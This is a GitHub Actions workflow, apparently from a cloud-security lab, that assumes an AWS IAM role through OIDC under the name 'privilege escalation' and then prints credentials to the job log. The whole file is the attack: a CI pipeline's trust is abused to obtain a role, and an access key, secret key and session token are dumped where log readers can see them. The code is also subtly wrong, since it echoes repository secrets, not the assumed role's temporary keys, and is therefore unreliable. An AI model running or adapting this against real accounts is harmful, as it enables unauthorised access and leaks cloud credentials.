name: 'AWS Privilege Escalation and Print Credentials'

on:
  workflow_dispatch: # Allows manual execution

permissions:
  id-token: write  # Required to request an OIDC token
  contents: read   # Required for the repository content access

jobs:
  escalate:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout Code
      uses: actions/checkout@v3

    - name: Configure AWS Credentials
      uses: aws-actions/configure-aws-credentials@v1
      with:
        aws-region: us-east-1
        role-to-assume: arn:aws:iam::683350395763:role/sts-lab-2-target  # Replace with the actual role ARN
        role-session-name: EscalationSession

    - name: Verify and Print AWS Temporary Credentials
      run: |
        # Get the AWS temporary credentials from the assumed role
        CREDS=$(aws sts get-caller-identity --query "Arn" --output text)
        echo "Temporary AWS Credentials:"
        echo "Assumed Role ARN: $CREDS"
        echo "AccessKeyId: ${{ secrets.AWS_ACCESS_KEY_ID }}"
        echo "SecretAccessKey: ${{ secrets.AWS_SECRET_ACCESS_KEY }}"
        echo "SessionToken: ${{ secrets.AWS_SESSION_TOKEN }}"
      shell: bash
